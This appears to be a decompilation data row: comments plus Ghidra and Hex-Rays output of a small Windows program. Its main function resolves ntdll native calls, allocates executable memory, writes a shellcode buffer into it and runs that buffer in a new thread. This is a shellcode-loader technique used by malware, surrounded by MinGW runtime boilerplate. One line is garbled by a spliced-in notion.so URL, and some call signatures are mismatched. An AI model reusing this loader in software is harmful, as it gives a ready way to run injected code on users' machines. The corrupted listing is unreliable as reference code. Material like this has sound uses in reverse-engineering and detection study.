// Copy the shellcode into the allocated memory region.
// Execute the shellcode in memory using a new thread.
// Wait for the thread to finish executing.","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
FARPROC _GetProcAddress@8(HMODULE hModule,LPCSTR lpProcName);
int __cdecl _puts(char *_Str);
HMODULE _GetModuleHandleA@4(LPCSTR lpModuleName);
HANDLE _GetCurrentProcess@0(void);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
undefined4 uVar1;
HMODULE pHVar2;
int iVar3;
HANDLE pvVar4;
undefined4 local_48;
undefined local_44 [4];
undefined4 local_40;
undefined4 local_3c;
undefined4 local_37;
undefined2 local_33;
undefined local_31;
FARPROC local_30;
FARPROC local_2c;
FARPROC local_28;
FARPROC local_24;
int *local_14;
local_14 = &_Argc;
___main();
local_37 = 0x2e8348fc;
local_33 = 0x2e2e;
local_31 = 0;
pHVar2 = _GetModuleHandleA_4(""ntdll.dll"");
local_24 = _GetProcAddress_8(pHVar2,""NtAllocateVirtualMemory"");
pHVar2 = _GetModuleHandleA_4(""ntdll.dll"");
local_28 = _GetProcAddress_8(pHVar2,""NtWriteVirtualMemory"");
pHVar2 = _GetModuleHandleA_4(""ntdll.dll"");
local_2c = _GetProcAddress_8(pHVar2,""NtCreateThreadEx"");
pHVar2 = _GetModuleHandleA_4(""ntdll.dll"");
local_30 = _GetProcAddress_8(pHVar2,""NtWaitForSingleObject"");
if ((((local_24 == (FARPROC)0x0) || (local_28 == (FARPROC)0x0)) || (local_2c == (FARPROC)0x0)) ||
(local_30 == (FARPROC)0x0)) {
_puts(""Failed to load native API functions."");
iVar3 = 1;
}
else {
local_3c = 0;
local_40 = 7;
pvVar4 = _GetCurrentProcess_0();
(*local_24)(pvVar4,&local_3c,0,&local_40,0x3000,0x40);
uVar1 = local_3c;
pvVar4 = _GetCurrentProcess_0();
(*local_28)(pvVar4,uVar1,&local_37,7,local_44);
uVar1 = local_3c;
pvVar4 = _GetCurrentProcess_0();
(*local_2c)(&local_48,0x20000000,0,pvVar4,uVar1,uVar1,0,0,0,0,0);
(*local_30)(local_48,0,0);
iVar3 = 0;
}
return iVar3;
}","/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
Copyright (c) 2007-2021 Hex-Rays mailto:info@hex-rays.com
Detected compiler: GNU C++
*/
#include <windows.h>
#include <defs.h>
#include <stdarg.h>
//-------------------------------------------------------------------------
// Function declarations
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo); // idb
void __noreturn sub_4011B0();
int _mingw32_init_mainargs();
void __noreturn mainCRTStartup(); // weak
void __noreturn WinMainCRTStartup(); // weak
// int __cdecl atexit(void (__cdecl *)());
int __gcc_register_frame();
void __cdecl __gcc_deregister_frame(); // idb
int __cdecl main(int argc, const char **argv, const char **envp);
char **_setargv();
// unsigned int __usercall __cpu_features_init@<eax>(__int32 a1@<ebp>);
void __cdecl __do_global_dtors(); // idb
int __do_global_ctors();
int __main();
int __stdcall TlsCallback_1(int a1, int a2, int a3);
int __stdcall __dyn_tls_init(int a1, int a2, int a3);
int __tlregdtor();
void sub_401C90();
int __cdecl ___w64_mingwthr_add_key_dtor(int a1, int a2);
int __cdecl ___w64_mingwthr_remove_key_dtor(int a1);
int __cdecl __mingw_TLScallback(int a1, int a2);
void __noreturn sub_401EC0(char *Format, ...);
// void *__usercall sub_401F10@<eax>(size_t Size@<ecx>, void *Src@<edx>, void *lpAddress@<eax>);
int _pei386_runtime_relocator();
int __cdecl fesetenv(const fenv_t *Env);
// int __usercall sub_402270@<eax>(char *a1@<eax>, unsigned int a2@<edx>);
// int __usercall sub_402310@<eax>(_DWORD *a1@<eax>);
// char *__usercall sub_402380@<eax>(char *a1@<eax>, int a2@<edx>, __int16 a3@<cx>);
// int __usercall sub_402640@<eax>(char *a1@<eax>, _BYTE *a2@<edx>, unsigned int a3@<ecx>);
// int __usercall sub_402860@<eax>(int a1@<eax>, int a2@<edx>);
// void __usercall sub_4028C0(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>);
// int __usercall sub_402910@<eax>(const char *a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4);
int *__cdecl __mingw_glob(char *Str, int a2, int a3, char **a4);
void __cdecl __mingw_globfree(void *a1);
char *__cdecl __mingw_dirname(char *Source);
// HANDLE __usercall sub_4036F0@<eax>(const CHAR *lpFileName@<eax>, int a2@<edx>);
// BOOL __usercall sub_4037C0@<eax>(void *hFindFile@<eax>, int a2@<edx>);
int __cdecl __mingw_opendir(char *Path); // idb
BOOL __cdecl __mingw_readdir(int a1);
int __cdecl __mingw_closedir(HANDLE *Block);
_DWORD *__cdecl __mingw_rewinddir(int a1);
int __cdecl __mingw_telldir(int a1);
int *__cdecl __mingw_seekdir(int a1, int a2);
// size_t __cdecl wcstombs(char *Dest, const wchar_t *Source, size_t MaxCount);
// int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList);
// int __cdecl tolower(int C);
// size_t __cdecl strlen(const char *Str);
// int __cdecl strcoll(const char *String1, const char *String2);
// _crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);
// char *__cdecl setlocale(int Category, const char *Locale);
// void *__cdecl realloc(void *Block, size_t Size);
// int __cdecl puts(const char *Buffer);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// size_t __cdecl mbstowcs(wchar_t *Dest, const char *Source, size_t MaxCount);
// void *__cdecl malloc(size_t Size);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// void __cdecl free(void *Block);
// void *__cdecl calloc(size_t Count, size_t Size);
// void __cdecl __noreturn abort();
// int __cdecl _setmode(int FileHandle, int Mode);
// int __cdecl _isctype(int C, int Type);
// char *__cdecl _fullpath(char *Buffer, const char *Path, size_t BufferCount);
// int *__cdecl _errno();
// void __cdecl _cexit();
// int *__cdecl __p__fmode();
// char ***__cdecl __p__environ();
// int __cdecl __getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex);
// LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetLastError();
// HANDLE __stdcall GetCurrentProcess();
// LPSTR __stdcall GetCommandLineA();
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// BOOL __stdcall FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// int __cdecl stricoll(const char *String1, const char *String2);
// char *__cdecl strdup(const char *String);
int register_frame_ctor();
//-------------------------------------------------------------------------
// Data declarations
func_ptr CTOR_LIST[] = { (func_ptr)0xFFFFFFFF }; // idb
int (_cdecl *data_start)(_DWORD) = NULL; // weak
int _CRT_glob = 2; // weak
fenv_t *_CRT_fenv = (fenv_t *)0xFFFFFFFD; // idb
int _fmode = 16384;
int (*off_404010)[36] = &dword_403D70; // weak
int dword_404014 = -1; // weak
int JCR_END = 0; // weak
int (__stdcall *__dyn_tls_init_callback)(_DWORD, _DWORD, _DWORD) = &__dyn_tls_init; // weak
const char Locale[2] = { '\0', '\0' }; // idb
const wchar_t Source[] = L"".""; // idb
_UNKNOWN EH_FRAME_BEGIN; // weak
char **_argv; // idb
int _argc; // idb
_UNKNOWN obj; // weak
int _CRT_fmode; // idb
int __cpu_features; // weak
int dword_407028; // weak
int dword_40703C; // weak
int dword_407040; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
int dword_40705C; // weak
int _CRT_MT; // weak
void *Block; // idb
HMODULE hmod_libgcc; // idb
// extern int ___mb_cur_max;
// extern void (__cdecl *___set_app_type)(_crt_app_type Type);
// extern void (__cdecl *__fpreset)();
// extern FILE __iob[];
// extern const unsigned __int16 *__pctype;
//----- (00401000) --------------------------------------------------------
LONG __stdcall TopLevelExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
{
DWORD ExceptionCode; // eax
_crt_signal_t v2; // eax
_crt_signal_t v4; // eax
_crt_signal_t v5; // eax
ExceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;
if ( ExceptionCode > 0xC0000091 )
{
if ( ExceptionCode == -1073741676 )
{
v4 = signal(8, 0);
if ( v4 == (_crt_signal_t)1 )
{
signal(8, (_crt_signal_t)1);
return -1;
}
LABEL_11:
if ( !v4 )
return 0;
v4(8);
return -1;
}
if ( ExceptionCode == -1073741674 )
{
LABEL_16:
v5 = signal(4, 0);
if ( v5 == (_crt_signal_t)1 )
{
signal(4, (_crt_signal_t)1);
return -1;
}
else
{
if ( !v5 )
return 0;
v5(4);
return -1;
}
}
if ( ExceptionCode != -1073741677 )
return 0;
LABEL_10:
v4 = signal(8, 0);
if ( v4 == (_crt_signal_t)1 )
{
signal(8, (_crt_signal_t)1);
fesetenv(0);
return -1;
}
goto LABEL_11;
}
if ( ExceptionCode >= 0xC000008D )
goto LABEL_10;
if ( ExceptionCode != -1073741819 )
{
if ( ExceptionCode != -1073741795 )
return 0;
goto LABEL_16;
}
v2 = signal(11, 0);
if ( v2 == (_crt_signal_t)1 )
{
signal(11, (_crt_signal_t)1);
return -1;
}
else
{
if ( !v2 )
return 0;
v2(11);
return -1;
}
}
//----- (004011B0) --------------------------------------------------------
void __noreturn sub_4011B0()
{
char ***v0; // eax
int v1; // ebx
int savedregs; // [esp+18h] [ebp+0h] BYREF
if ( __dyn_tls_init_callback )
__dyn_tls_init_callback(0, 2, 0);
SetUnhandledExceptionFilter(TopLevelExceptionFilter);
__cpu_features_init((__int32)&savedregs);
fesetenv(_CRT_fenv);
_setargv();
if ( _CRT_fmode )
{
_fmode = _CRT_fmode;
_setmode(__iob[0]._file, _CRT_fmode);
_setmode(__iob[1]._file, _CRT_fmode);
_setmode(__iob[2]._file, _CRT_fmode);
}
*__p__fmode() = _fmode;
_pei386_runtime_relocator();
__main();
v0 = __p__environ();
v1 = main(_argc, (const char **)_argv, (const char **)*v0);
_cexit();
ExitProcess(v1);
}
// 4050EC: using guessed type int (__stdcall *__dyn_tls_init_callback)(_DWORD, _DWORD, _DWORD);
//----- (004012A0) --------------------------------------------------------
int _mingw32_init_mainargs()
{
char v1[4]; // [esp+28h] [ebp-14h] BYREF
int v2[4]; // [esp+2Ch] [ebp-10h] BYREF
v2[0] = 0;
return __getmainargs(&_argc, &_argv, v1, _CRT_glob & 1, v2);
}
// 403C98: using guessed type int __cdecl __getmainargs(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404004: using guessed type int _CRT_glob;
// 4012A0: using guessed type int var_10[4];
// 4012A0: using guessed type char var_14[4];
//----- (004012E0) --------------------------------------------------------
void __noreturn mainCRTStartup()
{
___set_app_type(_crt_console_app);
sub_4011B0();
}
// 4012E0: using guessed type void __noreturn mainCRTStartup();
//----- (00401300) --------------------------------------------------------
void __noreturn WinMainCRTStartup()
{
___set_app_type(_crt_gui_app);
sub_4011B0();
}
// 401300: using guessed type void __noreturn WinMainCRTStartup();
//----- (00401340) --------------------------------------------------------
int __gcc_register_frame()
{
HMODULE ModuleHandleA; // eax
HMODULE v1; // ebx
FARPROC __register_frame_info; // esi
HMODULE v3; // eax
FARPROC _Jv_RegisterClasses; // edx
ModuleHandleA = GetModuleHandleA(""libgcc_s_dw2-1.dll"");
if ( ModuleHandleA )
{
v1 = ModuleHandleA;
hmod_libgcc = LoadLibraryA(""libgcc_s_dw2-1.dll"");
__register_frame_info = GetProcAddress(v1, ""_register_frame_info"");
data_start = (int (__cdecl *)(_DWORD))GetProcAddress(v1, ""_deregister_frame_info"");
}
else
{
data_start = 0;
__register_frame_info = 0;
}
if ( __register_frame_info )
((void (__cdecl *)(void *, void *))__register_frame_info)(&EH_FRAME_BEGIN, &obj);
if ( JCR_END )
{
v3 = GetModuleHandleA(""libgcj-16.dll"");
_Jv_RegisterClasses = 0;
if ( v3 )
_Jv_RegisterClasses = GetProcAddress(v3, ""_Jv_RegisterClasses"");
if ( _Jv_RegisterClasses )
((void (__cdecl *)(int *))_Jv_RegisterClasses)(&JCR_END);
}
return atexit(__gcc_deregister_frame);
}
// 404000: using guessed type int (_cdecl *data_start)(_DWORD);
// 404018: using guessed type int JCR_END;
//----- (00401430) --------------------------------------------------------
void __cdecl gcc_deregister_frame()
{
if ( data_start )
data_start(&EH_FRAME_BEGIN);
if ( hmod_libgcc )
FreeLibrary(hmod_libgcc);
}
// 404000: using guessed type int (_cdecl *data_start)(_DWORD);
//----- (00401460) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
HMODULE ModuleHandleA; // eax
HMODULE v4; // eax
HMODULE v5; // eax
HMODULE v6; // eax
HANDLE CurrentProcess; // eax
int v9; // ebx
HANDLE v10; // eax
int v11; // ebx
HANDLE v12; // eax
int v13; // [esp-4Ch] [ebp-8Ch]
int v14; // [esp-48h] [ebp-88h]
int v15; // [esp-44h] [ebp-84h]
int v16; // [esp-40h] [ebp-80h]
int v17; // [esp-3Ch] [ebp-7Ch]
int v18; // [esp-38h] [ebp-78h]
int v19; // [esp-34h] [ebp-74h]
int v20; // [esp-30h] [ebp-70h]
int v21; // [esp-30h] [ebp-70h]
int v22; // [esp+0h] [ebp-40h] BYREF
char v23[4]; // [esp+4h] [ebp-3Ch] BYREF
int v24; // [esp+8h] [ebp-38h]
int v25; // [esp+Ch] [ebp-34h] BYREF
int v26; // [esp+11h] [ebp-2Fh] BYREF
char v27[7]; // [esp+15h] [ebp-2Bh] BYREF
FARPROC NtCreateThreadEx; // [esp+1Ch] [ebp-24h]
FARPROC NtWriteVirtualMemory; // [esp+20h] [ebp-20h]
FARPROC NtAllocateVirtualMemory; // [esp+24h] [ebp-1Ch]
int *p_argc; // [esp+34h] [ebp-Ch]
p_argc = &argc;
__main();
v26 = 780355836;
strcpy(v27, "".."");
ModuleHandleA = GetModuleHandleA(""ntdll.dll"");
NtAllocateVirtualMemory = GetProcAddress(ModuleHandleA, ""NtAllocateVirtualMemory"");
v4 = GetModuleHandleA(""ntdll.dll"");
NtWriteVirtualMemory = GetProcAddress(v4, ""NtWriteVirtualMemory"");
v5 = GetModuleHandleA(""ntdll.dll"");
NtCreateThreadEx = GetProcAddress(v5, ""NtCreateThreadEx"");
v6 = GetModuleHandleA(""ntdll.dll"");
*(_DWORD *)&v27[3] = GetProcAddress(v6, ""NtWaitForSingleObject"");
if ( NtAllocateVirtualMemory && NtWriteVirtualMemory && NtCreateThreadEx && *(_DWORD *)&v27[3] )
{
v25 = 0;
v24 = 7;
CurrentProcess = GetCurrentProcess();
((void (__stdcall *)(HANDLE, int *, _DWORD))NtAllocateVirtualMemory)(CurrentProcess, &v25, 0);
v9 = v25;
v10 = GetCurrentProcess();
((void (__stdcall *)(HANDLE, int, int *, int, char *, int))NtWriteVirtualMemory)(v10, v9, &v26, 7, v23, v20);
v11 = v25;
v12 = GetCurrentProcess();
((void (__stdcall *)(int , int, _DWORD, HANDLE, int))NtCreateThreadEx)(&v22, 0x20000000, 0, v12, v11);
((void (__stdcall **)(int, _DWORD, _DWORD, int, int, int, int, int, int, int, int))&v27[3])(
v22,
0,
0,
v13,
v14,
v15,
v16,
v17,
v18,
v19,
v21);
return 0;
}
else
{
puts(""Failed to load native API functions."");
return 1;
}
}
// 4015BB: variable 'v20' is possibly undefined
// 401636: variable 'v13' is possibly undefined
// 401636: variable 'v14' is possibly undefined
// 401636: variable 'v15' is possibly undefined
// 401636: variable 'v16' is possibly undefined
// 401636: variable 'v17' is possibly undefined
// 401636: variable 'v18' is possibly undefined
// 401636: variable 'v19' is possibly undefined
// 401636: variable 'v21' is possibly undefined
// 401460: using guessed type int var_34;
// 401460: using guessed type char var_3C[4];
//----- (00401650) --------------------------------------------------------
char **_setargv()
{
const char *CommandLineA; // esi
int v1; // eax
void *v2; // esp
void *v3; // esp
char *v4; // edx
int v5; // eax
int v6; // ecx
char v7; // bl
char *v8; // ecx
char *v9; // eax
char **result; // eax
int v11; // edi
bool v12; // cl
int v13; // edi
char *v14; // eax
char *v15; // edi
char *v16; // ecx
int v17; // ebx
char *v18; // edi
int v19; // [esp+0h] [ebp-58h] BYREF
_BYTE v20[8]; // [esp+10h] [ebp-48h] BYREF
int v21; // [esp+18h] [ebp-40h]
int *v22; // [esp+1Ch] [ebp-3Ch]
int v23; // [esp+20h] [ebp-38h]
char *Str; // [esp+24h] [ebp-34h]
int v25; // [esp+28h] [ebp-30h]
int v26; // [esp+2Ch] [ebp-2Ch]
int v27[2]; // [esp+30h] [ebp-28h] BYREF
char **v28; // [esp+38h] [ebp-20h]
int v29; // [esp+3Ch] [ebp-1Ch]
if ( (_CRT_glob & 2) == 0 )
return (char **)_mingw32_init_mainargs();
v22 = &v19;
CommandLineA = GetCommandLineA();
v1 = 16 * ((2 * strlen(CommandLineA) + 17) >> 4);
v2 = alloca(v1);
v3 = alloca(v1);
v29 = 0;
v26 = 0;
v25 = 0;
v4 = v20;
Str = v20;
v23 = _CRT_glob & 0x4400 | 0x10;
v5 = 0;
LABEL_3:
while ( 1 )
{
v6 = *CommandLineA++;
v7 = *(CommandLineA - 1);
if ( !v7 )
break;
while ( 1 )
{
if ( v7 == 63 )
goto LABEL_40;
if ( v7 > 63 )
{
switch ( v7 )
{
case '\\':
if ( v26 == 39 )
*v4++ = 92;
else
++v5;
goto LABEL_3;
case '\x7F':
goto LABEL_40;
case '[':
if ( (_CRT_glob & 0x20) != 0 )
{
LABEL_40:
v11 = v5 - 1;
if ( v5 )
{
v12 = v26 != 0 || v6 == 127;
goto LABEL_26;
}
v12 = v26 != 0 || v6 == 127;
v14 = v4;
LABEL_28:
if ( v12 )
{
v4 = v14;
goto LABEL_31;
}
}
else
{
v11 = v5 - 1;
v12 = 1;
if ( v5 )
{
LABEL_26:
v13 = (int)&v4[v11 + 1];
v14 = v4;
do
*v14++ = 92;
while ( v14 != (char *)v13 );
goto LABEL_28;
}
LABEL_31:
v14 = v4 + 1;
*v4 = 127;
}
v4 = v14 + 1;
*v14 = v7;
v5 = 0;
goto LABEL_3;
}
LABEL_32:
v15 = &v4[v5];
if ( v5 )
{
do
*v4++ = 92;
while ( v4 != v15 );
}
else
{
v15 = v4;
}
if ( v26 )
{
LABEL_39:
v4 = v15 + 1;
*v15 = v7;
v5 = 0;
goto LABEL_3;
}
if ( ___mb_cur_max == 1 )
{
if ( (__pctype[v6] & 0x40) == 0 )
goto LABEL_38;
}
else
{
v21 = v6;
if ( !_isctype(v6, 64) )
{
v6 = v21;
LABEL_38:
if ( v6 != 9 )
goto LABEL_39;
}
}
if ( Str < v15 || v25 )
{
*v15 = 0;
v17 = v23;
v18 = Str;
__mingw_glob(Str, v23, 0, (char **)v27);
v4 = v18;
v25 = 0;
v23 = v17 | 1;
v5 = 0;
}
else
{
v4 = v15;
v5 = 0;
v25 = 0;
}
goto LABEL_3;
}
if ( v7 == 39 )
break;
if ( v7 == 42 )
goto LABEL_40;
if ( v7 != 34 )
goto LABEL_32;
if ( v5 >> 1 )
{
v8 = &v4[v5 >> 1];
do
*v4++ = 92;
while ( v4 != v8 );
}
else
{
v8 = v4;
}
if ( v26 == 39 || (v5 & 1) != 0 )
{
v4 = v8 + 1;
*v8 = 34;
v5 = 0;
v25 = 1;
goto LABEL_3;
}
++CommandLineA;
v4 = v8;
v26 ^= 0x22u;
v6 = *(CommandLineA - 1);
v5 = 0;
v25 = 1;
v7 = v6;
if ( !v6 )
goto LABEL_15;
}
if ( (_CRT_glob & 0x10) == 0 )
goto LABEL_32;
if ( v5 >> 1 )
{
v16 = &v4[v5 >> 1];
do
*v4++ = 92;
while ( v4 != v16 );
}
else
{
v16 = v4;
}
if ( v26 == 34 || (v5 & 1) != 0 )
{
v4 = v16 + 1;
*v16 = 39;
v5 = 0;
v25 = 1;
}
else
{
v26 ^= 0x27u;
v4 = v16;
v5 = 0;
v25 = 1;
}
}
LABEL_15:
if ( v5 )
{
v9 = &v4[v5];
do
*v4++ = 92;
while ( v4 != v9 );
}
else
{
v9 = v4;
}
if ( Str < v9 || v25 )
{
*v9 = 0;
__mingw_glob(Str, v23, 0, (char **)v27);
}
_argc = v27[1];
result = v28;
_argv = v28;
return result;
}
// 404004: using guessed type int _CRT_glob;
//----- (004019F0) --------------------------------------------------------
unsigned int __usercall __cpu_features_init@<eax>(__int32 a1@<ebp>)
{
unsigned int v1; // kr00_4
unsigned int v2; // kr04_4
unsigned int v3; // kr08_4
unsigned int result; // eax
int v14; // eax
__int32 v15; // ebx
__int32 v16; // ebx
int v26[50]; // [esp+0h] [ebp-208h] BYREF
__int32 v27[79]; // [esp+C8h] [ebp-140h] BYREF
unsigned int v28; // [esp+204h] [ebp-4h]
v1 = __getcallerseflags();
v28 = v1;
v2 = __readeflags();
__writeeflags(v2 ^ 0x200000);
v3 = __readeflags();
__writeeflags(v28);
result = v2 ^ v3;
if ( ((v2 ^ v3) & 0x200000) != 0 )
{
_EAX = 0;
__asm { cpuid }
if ( result )
{
_EAX = 1;
__asm { cpuid }
v14 = (_EDX & 0x100) != 0;
if ( (_ECX & 0x2000) != 0 )
v14 |= 0x80u;
if ( (_EDX & 0x8000) != 0 )
v14 |= 2u;
if ( (_EDX & 0x800000) != 0 )
v14 |= 4u;
if ( (_EDX & 0x1000000) != 0 )
{
v14 |= 8u;
v27[78] = a1;
_fxsave(v26);
v15 = v27[0];
v27[0] ^= 0x13C0DEu;
_fxrstor(v26);
v27[0] = v15;
_fxsave(v26);
v16 = _InterlockedExchange(v27, v15);
_fxrstor(v26);
if ( (v27[0] ^ v16) == 1294558 )
{
if ( (_EDX & 0x2000000) != 0 )
v14 |= 0x10u;
if ( (_EDX & 0x4000000) != 0 )
v14 |= 0x20u;
if ( (_ECX & 1) != 0 )
v14 |= 0x40u;
}
}
__cpu_features = v14;
_EAX = 0x80000000;
__asm { cpuid }
if ( result > 0x80000000 )
{
_EAX = -2147483647;
__asm { cpuid }
result = 0;
if ( _EDX < 0 )
result = 256;
if ( (_EDX & 0x40000000) != 0 )
result |= 0x200u;
__cpu_features |= result;
}
}
}
return result;
}
// 4019F0: could not find valid save-restore pair for ebp
// 407024: using guessed type int __cpu_features;
// 4019F0: using guessed type __int32 var_140[79];
//----- (00401B00) --------------------------------------------------------
void __cdecl __do_global_dtors()
{
void (v0)(void); // eax
v0 = (void ()(void))(*off_404010)[0];
if ( (off_404010)[0] )
{
do
{
v0();
v0 = (void ()(void))(off_404010)[1];
off_404010 = (int ()[36])((char *)off_404010 + 4);
}
while ( v0 );
}
}
// 404010: using guessed type int (*off_404010)[36];
//----- (00401B30) --------------------------------------------------------
int __do_global_ctors()
{
func_ptr i; // ebx
i = CTOR_LIST[0];
if ( CTOR_LIST[0] == (func_ptr)-1 )
{
for ( i = 0; CTOR_LIST[(_DWORD)i + 1]; i = (func_ptr)((char *)i + 1) )
;
}
for ( ; i; i = (func_ptr)((char *)i - 1) )
CTOR_LISTnotion://www.notion.so/Data-985bbecd5af14a66a3136a617e61750a;
return atexit(__do_global_dtors);
}
//----- (00401B80) --------------------------------------------------------
int __main()
{
int result; // eax
result = dword_407028;
if ( !dword_407028 )
{
dword_407028 = 1;
return __do_global_ctors();
}
return result;
}
// 407028: using guessed type int dword_407028;
//----- (00401BA0) --------------------------------------------------------
int __stdcall TlsCallback_1(int a1, int a2, int a3)
{
if ( a2 != 3 && a2 )
return 1;
__mingw_TLScallback(a1, a2);
return 1;
}
//----- (00401BF0) --------------------------------------------------------
int __stdcall __dyn_tls_init(int a1, int a2, int a3)
{
if ( _CRT_MT != 2 )
_CRT_MT = 2;
if ( a2 == 1 )
__mingw_TLScallback(a1, 1);
return 1;
}
// 407064: using guessed type int _CRT_MT;
//----- (00401C80) --------------------------------------------------------
int __tlregdtor()
{
return 0;
}
//----- (00401C90) --------------------------------------------------------
void sub_401C90()
{
int i; // ebx
LPVOID Value; // esi
EnterCriticalSection(&CriticalSection);
for ( i = dword_40703C; i; i = *(_DWORD )(i + 8) )
{
Value = TlsGetValue((_DWORD )i);
if ( !GetLastError() && Value )
((void (__cdecl **)(LPVOID))(i + 4))(Value);
}
LeaveCriticalSection(&CriticalSection);
}
// 40703C: using guessed type int dword_40703C;
//----- (00401CF0) --------------------------------------------------------
int __cdecl ___w64_mingwthr_add_key_dtor(int a1, int a2)
{
int v2; // esi
_DWORD *v4; // eax
int v5; // ebx
int v6; // eax
v2 = 0;
if ( !dword_407040 )
return v2;
v4 = calloc(1u, 0xCu);
v5 = (int)v4;
if ( !v4 )
return -1;
*v4 = a1;
v4[1] = a2;
EnterCriticalSection(&CriticalSection);
v6 = dword_40703C;
dword_40703C = v5;
*(_DWORD *)(v5 + 8) = v6;
LeaveCriticalSection(&CriticalSection);
return 0;
}
// 40703C: using guessed type int dword_40703C;
// 407040: using guessed type int dword_407040;
//----- (00401D80) --------------------------------------------------------
int __cdecl ___w64_mingwthr_remove_key_dtor(int a1)
{
int v2; // edx
_DWORD *v3; // eax
if ( !dword_407040 )
return 0;
EnterCriticalSection(&CriticalSection);
v2 = dword_40703C;
if ( dword_40703C )
{
if ( a1 == *(_DWORD *)dword_40703C )
{
dword_40703C = *(_DWORD *)(dword_40703C + 8);
v3 = (_DWORD *)v2;
LABEL_12:
free(v3);
LeaveCriticalSection(&CriticalSection);
return 0;
}
while ( 1 )
{
v3 = *(_DWORD **)(v2 + 8);
if ( !v3 )
break;
if ( *v3 == a1 )
{
*(_DWORD *)(v2 + 8) = v3[2];
goto LABEL_12;
}
v2 = *(_DWORD *)(v2 + 8);
}
}
LeaveCriticalSection(&CriticalSection);
return 0;
}
// 40703C: using guessed type int dword_40703C;
// 407040: using guessed type int dword_407040;
//----- (00401E20) --------------------------------------------------------
int __cdecl __mingw_TLScallback(int a1, int a2)
{
if ( a2 == 1 )
{
if ( !dword_407040 )
InitializeCriticalSection(&CriticalSection);
dword_407040 = 1;
return 1;
}
else
{
if ( a2 )
{
if ( a2 == 3 )
{
if ( dword_407040 )
sub_401C90();
}
}
else
{
if ( dword_407040 )
sub_401C90();
if ( dword_407040 == 1 )
{
dword_407040 = 0;
DeleteCriticalSection(&CriticalSection);
}
}
return 1;
}
}
// 407040: using guessed type int dword_407040;
//----- (00401EC0) --------------------------------------------------------
void __noreturn sub_401EC0(char *Format, ...)
{
va_list va; // [esp+24h] [ebp+8h] BYREF
va_start(va, Format);
fwrite(""Mingw runtime failure:\n"", 1u, 0x17u, &__iob[2]);
vfprintf(&__iob[2], Format, va);
abort();
}
//----- (00401F10) --------------------------------------------------------
void *__usercall sub_401F10@<eax>(size_t Size@<ecx>, void *Src@<edx>, void *lpAddress@<eax>)
{
void *result; // eax
DWORD Protect; // [esp+1Ch] [ebp-40h]
DWORD flOldProtect; // [esp+20h] [ebp-3Ch] BYREF
struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+24h] [ebp-38h] BYREF
if ( !VirtualQuery(lpAddress, &Buffer, 0x1Cu) )
sub_401EC0("" VirtualQuery failed for %d bytes at address %p"", 28, lpAddress);
if ( Buffer.Protect == 64 || Buffer.Protect == 4 )
return memcpy(lpAddress, Src, Size);
VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, 0x40u, &flOldProtect);
Protect = Buffer.Protect;
result = memcpy(lpAddress, Src, Size);
if ( Protect != 64 && Protect != 4 )
return (void *)VirtualProtect(Buffer.BaseAddress, Buffer.RegionSize, flOldProtect, &flOldProtect);
return result;
}
//----- (00402000) --------------------------------------------------------
int _pei386_runtime_relocator()
{
int result; // eax
result = dword_40705C;
if ( !dword_40705C )
{
dword_40705C = 1;
return 0;
}
return result;
}
// 402000: could not find valid save-restore pair for ebx
// 402000: could not find valid save-restore pair for edi
// 402000: could not find valid save-restore pair for esi
// 40705C: using guessed type int dword_40705C;
//----- (00402200) --------------------------------------------------------
int __cdecl fesetenv(const fenv_t *Env)
{
unsigned int Fe_stat_low; // [esp+Ch] [ebp-10h]
_EAX = Env;
Fe_stat_low = 8064;
if ( Env == (const fenv_t *)-3 )
{
dword_404014 = -1;
goto LABEL_12;
}
if ( Env != (const fenv_t *)-4 )
{
if ( !Env )
_EAX = (const fenv_t *)dword_404014;
if ( _EAX != (const fenv_t *)-1 )
{
if ( _EAX != (const fenv_t *)-2 )
{
__asm { fldenv byte ptr [eax] }
Fe_stat_low = LOWORD(_EAX[3]._Fe_stat);
goto LABEL_8;
}
goto LABEL_14;
}
LABEL_12:
__asm { fninit }
goto LABEL_8;
}
dword_404014 = -2;
LABEL_14:
__fpreset();
LABEL_8:
if ( (__cpu_features & 0x10) != 0 )
_mm_setcsr(Fe_stat_low);
return 0;
}
// 404014: using guessed type int dword_404014;
